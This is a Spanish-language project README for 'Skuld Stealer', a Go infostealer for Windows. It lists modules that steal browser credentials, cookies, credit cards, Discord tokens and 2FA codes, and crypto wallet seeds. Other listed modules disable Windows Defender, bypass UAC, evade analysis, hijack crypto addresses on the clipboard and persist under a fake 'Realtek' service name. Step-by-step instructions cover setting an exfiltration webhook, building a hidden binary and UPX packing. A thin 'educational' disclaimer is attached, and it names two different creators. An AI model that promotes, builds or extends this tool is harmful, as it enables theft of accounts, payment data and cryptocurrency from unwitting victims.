
<br>

<p align="center">
    <img src="/assets/avatar.png" width=100  >
</p>

<h1 align="center">Skuld Stealer</h1>

<p align="center">Malware escrito en Go dirigido a sistemas Windows, que extrae datos de usuario de Discord, navegadores, billeteras crypto y más, de cada usuario en cada disco. (PoC. Solo con fines educativos)</p>

---

<details>
  <summary>Tabla de Contenidos</summary>
  <ol>
    <li>
      <a href="#sobre-el-proyecto">Sobre el Proyecto</a>
      <ul>
        <li><a href="#características">Características</a></li>
      </ul>
    </li>
    <li>
      <a href="#comenzando">Comenzando</a>
      <ul>
        <li><a href="#prerequisitos">Prerequisitos</a></li>
        <li><a href="#instalación">Instalación</a></li>
      </ul>
    </li>
    <li><a href="#uso">Uso</a></li>
    <li><a href="#vista-previa">Vista Previa</a></li>
    <li><a href="#eliminar">Eliminar</a></li>
    <li><a href="#contribuir">Contribuir</a></li>
    <li><a href="#licencia">Licencia</a></li>
    <li><a href="#contacto">Contacto</a></li>
    <li><a href="#agradecimientos">Agradecimientos</a></li>
    <li><a href="#descargo-de-responsabilidad">Descargo de Responsabilidad</a></li>
  </ol>
</details>

## Sobre el proyecto

Este proyecto de prueba de concepto demuestra un stealer "orientado a Discord" implementado en Go. El malware opera en sistemas Windows y utiliza la técnica fodhelper.exe para la elevación de privilegios. Al elevar los privilegios, el malware obtiene acceso a todas las sesiones de usuario en cada disco.

### Características:

- [antidebug](https://github.com/hackirby/skuld/blob/main/modules/antidebug/antidebug.go): Termina herramientas de depuración.
- [antivirus](https://github.com/hackirby/skuld/blob/main/modules/antivirus/antivirus.go): Desactiva Windows Defender y bloquea el acceso a sitios web de antivirus.
- [antivm](https://github.com/hackirby/skuld/blob/main/modules/antivm/antivm.go): Detecta y sale cuando se ejecuta en máquinas virtuales (VMs).
- [browsers](https://github.com/hackirby/skuld/blob/main/modules/browsers/browsers.go):
  - Roba inicios de sesión, cookies, tarjetas de crédito, historial y listas de descarga de 37 navegadores basados en Chromium.
  - Roba inicios de sesión, cookies, historial y listas de descarga de 10 navegadores Gecko.
- [clipper](https://github.com/hackirby/skuld/blob/main/modules/clipper/clipper.go): Reemplaza el contenido del portapapeles del usuario con una dirección crypto especificada al copiar otra dirección.
- [commonfiles](https://github.com/hackirby/skuld/tree/main/modules/commonfiles/commonfiles.go): Roba archivos sensibles de ubicaciones comunes.
- [discodes](https://github.com/hackirby/skuld/blob/main/modules/discodes/discodes.go): Captura códigos de respaldo de autenticación de dos factores (2FA) de Discord.
- [discordinjection](https://github.com/hackirby/skuld/blob/main/modules/discordinjection/injection.go):
  - Intercepta solicitudes de inicio de sesión, registro y 2FA.
  - Captura solicitudes de códigos de respaldo.
  - Monitorea solicitudes de cambio de correo electrónico/contraseña.
  - Intercepta solicitudes de adición de tarjeta de crédito/PayPal.
  - Bloquea el uso de códigos QR para iniciar sesión.
  - Previene solicitudes para ver dispositivos.
- [fakerror](https://github.com/hackirby/skuld/blob/main/modules/fakeerror/fakeerror.go): Engaña al usuario haciéndole creer que el programa se cerró debido a un error.
- [games](https://github.com/hackirby/skuld/blob/main/modules/games/games.go): Extrae sesiones de Epic Games, Uplay, Minecraft (14 lanzadores) y Riot Games.
- [hideconsole](https://github.com/hackirby/skuld/blob/main/modules/hideconsole/hideconsole.go): Módulo para ocultar la consola.
- [startup](https://github.com/hackirby/skuld/blob/main/modules/startup/startup.go): Asegura que el programa se ejecute al inicio del sistema.
- [system](https://github.com/hackirby/skuld/blob/main/modules/system/system.go): Reúne información sobre CPU, GPU, RAM, IP, ubicación, redes Wi-Fi guardadas, y más.
- [tokens](https://github.com/hackirby/skuld/blob/main/modules/tokens/tokens.go): Extrae tokens de 4 aplicaciones de Discord, navegadores basados en Chromium y navegadores Gecko.
- [uacbypass](https://github.com/hackirby/skuld/blob/main/modules/uacbypass/bypass.go): Otorga privilegios para robar datos de usuario de otros usuarios.
- [wallets](https://github.com/hackirby/skuld/blob/main/modules/wallets/wallets.go): Roba datos de 10 billeteras locales y 55 extensiones de billetera.
- [walletsinjection](https://github.com/hackirby/skuld/blob/main/modules/walletsinjection/walletsinjection.go): Captura frases mnemotécnicas y contraseñas de 2 billeteras crypto.

## Comenzando

### Prerequisitos

* [Git](https://git-scm.com/downloads)
* [El Lenguaje de Programación Go](https://go.dev/dl/)

### Instalación
Para instalar este proyecto usando Git, sigue estos pasos:

- Clonar el Repositorio:

```bash
git clone https://github.com/hackirby/skuld
```
- Navegar al Directorio del Proyecto:

```bash
cd skuld
```

## Uso

Puedes usar la plantilla del Proyecto:

- Abre `main.go` y edita la configuración con tu webhook de Discord y tus direcciones crypto

- Compila la plantilla: (reduce el tamaño del binario usando `-s -w`)

```bash
go build -ldflags "-s -w"
```

- También puedes ocultar la consola sin el módulo `hideconsole` (debes eliminar la verificación `program.IsAlreadyRunning()` de `main.go` antes) ejecutando

```bash
go build -ldflags "-s -w -H=windowsgui"
```

- También puedes opcionalmente empaquetar el ejecutable de salida con UPX, lo que reducirá el tamaño del binario de ~10MB a ~3MB. Para hacer esto, instala [UPX](https://github.com/upx/upx/releases/) y ejecuta

```bash
upx.exe --ultra-brute skuld.exe
```

- También puedes usar skuld en tu propio código Go. Simplemente importa el módulo deseado así:
```go
package main

import "github.com/hackirby/skuld/modules/hideconsole"

func main() {
  hideconsole.Run()
}
```

## Vista Previa

![Vista del sistema](/assets/system.png)

![Vista de navegadores](/assets/browsers.png)

![Vista de token](/assets/token.png)

![Vista de discodes](/assets/discodes.png)

![Vista de wallets](/assets/wallets.png)

![Vista de games](/assets/games.png)

![Vista de codes](/assets/codes.png)


## Eliminar

Esta guía te ayudará a eliminar skuld de tu sistema

1. Abre PowerShell como administrador

2. Termina los procesos que podrían ser skuld

```bash
taskkill /f /t /im skuld.exe
taskkill /f /t /im SecurityHealthSystray.exe
```

(usa `tasklist` para listar todos los procesos en ejecución, skuld.exe y SecurityHealthSystray.exe son los nombres predeterminados)

3. Elimina skuld del inicio
```bash
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Realtek HD Audio Universal Service" /f
```

(Realtek HD Audio Universal Service es el nombre predeterminado)

4. Habilita Windows Defender:

Puedes hacerlo ejecutando este [script .bat](https://github.com/TairikuOokami/Windows/blob/main/Microsoft%20Defender%20Enable.bat) (no soy el desarrollador detrás de esto, asegúrate de que el archivo no contenga malware)

## Contribuir
¡Las contribuciones a este proyecto son bienvenidas! Siéntete libre de abrir issues, enviar pull requests o sugerir mejoras. Asegúrate de seguir las [Pautas de Contribución](https://github.com/hackirby/skuld/blob/main/CONTRIBUTING.md)

También puedes apoyar el desarrollo de este proyecto dejando una estrella ⭐ o haciéndome una donación. ¡Cada pequeña ayuda cuenta!

## Licencia
Esta biblioteca se publica bajo la Licencia MIT. Ver archivo LICENSE para más información.

## Contacto
Si tienes alguna pregunta o necesitas ayuda adicional, por favor contacta a [@hackirby:matrix.org
](https://discord.gg/tfRuSC52Da)

## Descargo de Responsabilidad

### Aviso Importante: Esta herramienta está destinada únicamente para fines educativos.

Este software, denominado skuld, se proporciona estrictamente con fines educativos e investigativos. Bajo ninguna circunstancia debe esta herramienta ser utilizada para actividades maliciosas, incluyendo pero no limitado a acceso no autorizado, robo de datos, o cualquier otra acción dañina.

### Responsabilidad de Uso:

Al acceder y utilizar esta herramienta, reconoces que eres el único responsable de tus acciones. Cualquier uso indebido de este software está estrictamente prohibido, y el creador (hackirby) renuncia a cualquier responsabilidad sobre cómo se utilice esta herramienta. Eres plenamente responsable de asegurar que tu uso cumpla con todas las leyes y regulaciones aplicables en tu jurisdicción.

### Sin Responsabilidad:

El creador (hackirby) de esta herramienta no será considerado responsable por daños o consecuencias legales resultantes del uso o mal uso de este software. Esto incluye, pero no se limita a, daños directos, indirectos, incidentales, consecuenciales o punitivos que surjan de tu acceso, uso o incapacidad para usar la herramienta.

### Sin Soporte:

El creador (HANNIBAL THO) no proporcionará ningún soporte, guía o asistencia relacionada con el mal uso de esta herramienta. Cualquier consulta relacionada con actividades maliciosas será ignorada.

### Aceptación de Términos:

Al utilizar esta herramienta, signifies tu aceptación de este descargo de responsabilidad. Si no estás de acuerdo con los términos establecidos en este descargo, no utilices el software.
